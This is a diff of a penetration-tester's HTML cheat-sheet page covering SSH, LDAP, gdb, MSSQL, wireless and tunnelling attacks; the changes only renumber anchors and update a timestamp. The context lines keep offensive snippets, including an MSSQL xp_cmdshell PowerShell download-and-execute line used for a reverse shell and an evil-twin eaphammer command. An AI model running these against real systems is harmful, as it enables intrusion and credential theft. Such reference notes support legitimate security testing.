@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2026-01-07 Wed 23:38 -->
+<!-- 2026-01-08 Thu 00:22 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Network stuff</title>
@@ -16,7 +16,7 @@
     <div class="banner">
         <a href="/">
             <div class="logo" style="background-image:url(/static/img/profile.jpg)"></div>
-            <h1>skywhi@dreamland:/var/log$ <span class="blink">_</span></h1>
+            <h1>skw@www:/var/log$ <span class="blink">_</span></h1>
         </a>
     </div>
     <nav>
@@ -38,24 +38,24 @@
 <ul>
 <li><a href="#ssh">SSH - port 22</a></li>
 <li><a href="#ssl">SSL/TLS</a></li>
-<li><a href="#org382d790">LDAP</a></li>
-<li><a href="#org8fddc62">GDB server</a></li>
-<li><a href="#orgb7cdf3f">DNS rebinding</a></li>
-<li><a href="#orgb0f578a">Crack P12 (PKCS12) certificate passwords</a></li>
-<li><a href="#org2429238">Microsoft SQL Server (MSSQL)</a></li>
+<li><a href="#org102116b">LDAP</a></li>
+<li><a href="#org24fecb7">GDB server</a></li>
+<li><a href="#org3815aba">DNS rebinding</a></li>
+<li><a href="#orgbc72723">Crack P12 (PKCS12) certificate passwords</a></li>
+<li><a href="#org3684fa5">Microsoft SQL Server (MSSQL)</a></li>
 </ul>
 </li>
 <li><a href="#wireless">Wireless</a>
 <ul>
-<li><a href="#org5693e2b">Recon</a></li>
-<li><a href="#org3e431d6">WPA2-PSK capturing and cracking</a></li>
-<li><a href="#org684c0e5">Attacking WPA2-MGT with Evil Twin</a></li>
+<li><a href="#orge470e48">Recon</a></li>
+<li><a href="#org16b973d">WPA2-PSK capturing and cracking</a></li>
+<li><a href="#orgfa2b43c">Attacking WPA2-MGT with Evil Twin</a></li>
 </ul>
 </li>
-<li><a href="#org7d856d4">Port forwarding and reverse shells</a>
+<li><a href="#orgb6d188d">Port forwarding and reverse shells</a>
 <ul>
-<li><a href="#org8474f19">Chisel</a></li>
-<li><a href="#org9c61e05">Socat cheatsheet</a></li>
+<li><a href="#orgfb72a98">Chisel</a></li>
+<li><a href="#org24feba2">Socat cheatsheet</a></li>
 </ul>
 </li>
 </ul>
@@ -68,25 +68,25 @@
 <h3 id="ssh">SSH - port 22</h3>
 <div class="outline-text-3" id="text-ssh">
 </div>
-<div id="outline-container-orgf3d83ab" class="outline-4">
-<h4 id="orgf3d83ab">Check SSH configuration</h4>
-<div class="outline-text-4" id="text-orgf3d83ab">
+<div id="outline-container-org32c260b" class="outline-4">
+<h4 id="org32c260b">Check SSH configuration</h4>
+<div class="outline-text-4" id="text-org32c260b">
 <ul class="org-ul">
 <li><a href="https://github.com/arthepsy/ssh-audit">ssh-audit</a> for detailed fingerprinting</li>
 </ul>
 </div>
 </div>
-<div id="outline-container-orgc39b63e" class="outline-4">
-<h4 id="orgc39b63e">Bruteforcing credentials</h4>
-<div class="outline-text-4" id="text-orgc39b63e">
+<div id="outline-container-org44216f8" class="outline-4">
+<h4 id="org44216f8">Bruteforcing credentials</h4>
+<div class="outline-text-4" id="text-org44216f8">
 <p>
 Use metasploit's <code>auxiliary/scanner/ssh/ssh_login</code> or <a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a>.
 </p>
 </div>
 </div>
-<div id="outline-container-org3f6f915" class="outline-4">
-<h4 id="org3f6f915">Bypass login shell</h4>
-<div class="outline-text-4" id="text-org3f6f915">
+<div id="outline-container-orgfff5d58" class="outline-4">
+<h4 id="orgfff5d58">Bypass login shell</h4>
+<div class="outline-text-4" id="text-orgfff5d58">
 <p>
 To bypass restrictive login shells such as <code>/usr/bin/nologin</code> or
 <code>/usr/bin/false</code> you can add your own command while connecting upon SSH that
@@ -100,9 +100,9 @@ is always a good candidate.
 </div>
 </div>
 </div>
-<div id="outline-container-orgd3150e5" class="outline-4">
-<h4 id="orgd3150e5">libssh authentication bypass</h4>
-<div class="outline-text-4" id="text-orgd3150e5">
+<div id="outline-container-org743a00d" class="outline-4">
+<h4 id="org743a00d">libssh authentication bypass</h4>
+<div class="outline-text-4" id="text-org743a00d">
 <p>
 Use the python <a href="https://www.exploit-db.com/exploits/46307">script</a> from exploit-db.com or metasploit's
 <code>auxiliary/scanner/ssh/libssh_auth_bypass</code> to exploit an authentication bypass
@@ -110,9 +110,9 @@ present in libssh before versions 0.7.6 and 0.8.4 (<a href="https://www.cvedetai
 </p>
 </div>
 </div>
-<div id="outline-container-org4720941" class="outline-4">
-<h4 id="org4720941">Debian OpenSSL Predictable PRNG (CVE-2008-0166)</h4>
-<div class="outline-text-4" id="text-org4720941">
+<div id="outline-container-org0e6ce0f" class="outline-4">
+<h4 id="org0e6ce0f">Debian OpenSSL Predictable PRNG (CVE-2008-0166)</h4>
+<div class="outline-text-4" id="text-org0e6ce0f">
 <p>
 At some point in 2008, Debian shipped a buggy OpenSSL implementation. This bug
 biaised the seeds used by OpenSSL's PRNG, resulting in only 32,767 possible
@@ -125,9 +125,9 @@ python script</a>.
 </p>
 </div>
 </div>
-<div id="outline-container-org79d2c13" class="outline-4">
-<h4 id="org79d2c13">Tools &amp; resources</h4>
-<div class="outline-text-4" id="text-org79d2c13">
+<div id="outline-container-org0c860f1" class="outline-4">
+<h4 id="org0c860f1">Tools &amp; resources</h4>
+<div class="outline-text-4" id="text-org0c860f1">
 <p>
 Utilities:
 </p>
@@ -150,9 +150,9 @@ Configuration guides:
 <h3 id="ssl">SSL/TLS</h3>
 <div class="outline-text-3" id="text-ssl">
 </div>
-<div id="outline-container-orgb06e5d6" class="outline-4">
-<h4 id="orgb06e5d6">Check SSL/TLS configuration</h4>
-<div class="outline-text-4" id="text-orgb06e5d6">
+<div id="outline-container-org665f509" class="outline-4">
+<h4 id="org665f509">Check SSL/TLS configuration</h4>
+<div class="outline-text-4" id="text-org665f509">
 <ul class="org-ul">
 <li><a href="https://testssl.sh/">testssl.sh</a>: very exhaustive checks.</li>
 <li><a href="https://github.com/rbsec/sslscan/">sslscan</a>.</li>
@@ -161,13 +161,13 @@ Configuration guides:
 </div>
 </div>
 </div>
-<div id="outline-container-org382d790" class="outline-3">
-<h3 id="org382d790">LDAP</h3>
-<div class="outline-text-3" id="text-org382d790">
+<div id="outline-container-org102116b" class="outline-3">
+<h3 id="org102116b">LDAP</h3>
+<div class="outline-text-3" id="text-org102116b">
 </div>
-<div id="outline-container-orgd2ec312" class="outline-4">
-<h4 id="orgd2ec312">Enumeration</h4>
-<div class="outline-text-4" id="text-orgd2ec312">
+<div id="outline-container-orgf7671f9" class="outline-4">
+<h4 id="orgf7671f9">Enumeration</h4>
+<div class="outline-text-4" id="text-orgf7671f9">
 <p>
 <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap">Hacktricks on LDAP</a>.
 </p>
@@ -179,9 +179,9 @@ ldapsearch -x -H ldap://10.10.10.1 -D <span class="org-string">''</span> -w <spa
 </div>
 </div>
 </div>
-<div id="outline-container-orgecc3db6" class="outline-4">
-<h4 id="orgecc3db6">LDAP Pass-Back Attack</h4>
-<div class="outline-text-4" id="text-orgecc3db6">
+<div id="outline-container-org55451c2" class="outline-4">
+<h4 id="org55451c2">LDAP Pass-Back Attack</h4>
+<div class="outline-text-4" id="text-org55451c2">
 <p>
 This attacks relies on tricking a device to connect to a rogue LDAP server
 operated by the attacker. The server is configured so that only plaintext
@@ -201,9 +201,9 @@ The setup for the attack is described <a href="https://medium.com/r3d-buck3t/pwn
 </div>
 </div>
 </div>
-<div id="outline-container-org8fddc62" class="outline-3">
-<h3 id="org8fddc62">GDB server</h3>
-<div class="outline-text-3" id="text-org8fddc62">
+<div id="outline-container-org24fecb7" class="outline-3">
+<h3 id="org24fecb7">GDB server</h3>
+<div class="outline-text-3" id="text-org24fecb7">
 <p>
 It is possible to obtain remote command execution when a gdb instance is
 listening. There are several exploits available but this can also be achieved
@@ -222,25 +222,25 @@ gdb$ run
 </div>
 </div>
 </div>
-<div id="outline-container-orgb7cdf3f" class="outline-3">
-<h3 id="orgb7cdf3f">DNS rebinding</h3>
-<div class="outline-text-3" id="text-orgb7cdf3f">
+<div id="outline-container-org3815aba" class="outline-3">
+<h3 id="org3815aba">DNS rebinding</h3>
+<div class="outline-text-3" id="text-org3815aba">
 <p>
 -<a href="https://lock.cmpxchg8b.com/rebinder.html">rbndr.us</a> rebinding service.
 </p>
 </div>
 </div>
-<div id="outline-container-orgb0f578a" class="outline-3">
-<h3 id="orgb0f578a">Crack P12 (PKCS12) certificate passwords</h3>
-<div class="outline-text-3" id="text-orgb0f578a">
+<div id="outline-container-orgbc72723" class="outline-3">
+<h3 id="orgbc72723">Crack P12 (PKCS12) certificate passwords</h3>
+<div class="outline-text-3" id="text-orgbc72723">
 <ul class="org-ul">
 <li><a href="https://github.com/Ridter/p12tool">p12tool</a> (go).</li>
 </ul>
 </div>
 </div>
-<div id="outline-container-org2429238" class="outline-3">
-<h3 id="org2429238">Microsoft SQL Server (MSSQL)</h3>
-<div class="outline-text-3" id="text-org2429238">
+<div id="outline-container-org3684fa5" class="outline-3">
+<h3 id="org3684fa5">Microsoft SQL Server (MSSQL)</h3>
+<div class="outline-text-3" id="text-org3684fa5">
 <p>
 Once authenticated, upload and execute a reverse shell with impacket's
 <code>mssqlclient.py</code>.
@@ -258,9 +258,9 @@ SQL&gt; xp_cmdshell <span class="org-string">"powershell IEX(New-Object Net.webc
 <h2 id="wireless">Wireless</h2>
 <div class="outline-text-2" id="text-wireless">
 </div>
-<div id="outline-container-org5693e2b" class="outline-3">
-<h3 id="org5693e2b">Recon</h3>
-<div class="outline-text-3" id="text-org5693e2b">
+<div id="outline-container-orge470e48" class="outline-3">
+<h3 id="orge470e48">Recon</h3>
+<div class="outline-text-3" id="text-orge470e48">
 <p>
 Turn an interface into monitor mode and start sniffing for networks in range.
 </p>
@@ -278,9 +278,9 @@ tcpdump -i &lt;interface&gt;mon -w app_traffic.pcap
 </div>
 </div>
 </div>
-<div id="outline-container-org3e431d6" class="outline-3">
-<h3 id="org3e431d6">WPA2-PSK capturing and cracking</h3>
-<div class="outline-text-3" id="text-org3e431d6">
+<div id="outline-container-org16b973d" class="outline-3">
+<h3 id="org16b973d">WPA2-PSK capturing and cracking</h3>
+<div class="outline-text-3" id="text-org16b973d">
 <ol class="org-ol">
 <li>Select a target network and wait for the capture of WPA2 handshakes.</li>
 <li>If needed, activelty de-auth clients to capture handshakes upon their
@@ -302,9 +302,9 @@ handshakes.</li>
 </div>
 </div>
 </div>
-<div id="outline-container-org684c0e5" class="outline-3">
-<h3 id="org684c0e5">Attacking WPA2-MGT with Evil Twin</h3>
-<div class="outline-text-3" id="text-org684c0e5">
+<div id="outline-container-orgfa2b43c" class="outline-3">
+<h3 id="orgfa2b43c">Attacking WPA2-MGT with Evil Twin</h3>
+<div class="outline-text-3" id="text-orgfa2b43c">
 <p>
 It requires two wireless interfaces: one connected to internet or to the target
 network and another, ideally powerful, interface that will server as an access
@@ -322,13 +322,13 @@ $ eaphammer -i wlan0 -I wlan1 --essid <span class="org-string">"Target"</span> -
 </div>
 </div>
 </div>
-<div id="outline-container-org7d856d4" class="outline-2">
-<h2 id="org7d856d4">Port forwarding and reverse shells</h2>
-<div class="outline-text-2" id="text-org7d856d4">
+<div id="outline-container-orgb6d188d" class="outline-2">
+<h2 id="orgb6d188d">Port forwarding and reverse shells</h2>
+<div class="outline-text-2" id="text-orgb6d188d">
 </div>
-<div id="outline-container-org8474f19" class="outline-3">
-<h3 id="org8474f19">Chisel</h3>
-<div class="outline-text-3" id="text-org8474f19">
+<div id="outline-container-orgfb72a98" class="outline-3">
+<h3 id="orgfb72a98">Chisel</h3>
+<div class="outline-text-3" id="text-orgfb72a98">
 <p>
 <a href="https://github.com/jpillora/chisel">chisel</a> is another networking swiss army knife (get precompiled binaries from the
 <a href="https://github.com/jpillora/chisel/releases">release page</a>).
@@ -343,9 +343,9 @@ $ eaphammer -i wlan0 -I wlan1 --essid <span class="org-string">"Target"</span> -
 </div>
 </div>
 </div>
-<div id="outline-container-org9c61e05" class="outline-3">
-<h3 id="org9c61e05">Socat cheatsheet</h3>
-<div class="outline-text-3" id="text-org9c61e05">
+<div id="outline-container-org24feba2" class="outline-3">
+<h3 id="org24feba2">Socat cheatsheet</h3>
+<div class="outline-text-3" id="text-org24feba2">
 <p>
 You can retrieve compiled executables for socat on the wonderful <a href="https://github.com/andrew-d/static-binaries">static-binaries</a>
 project: <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat">linux x86_64</a>
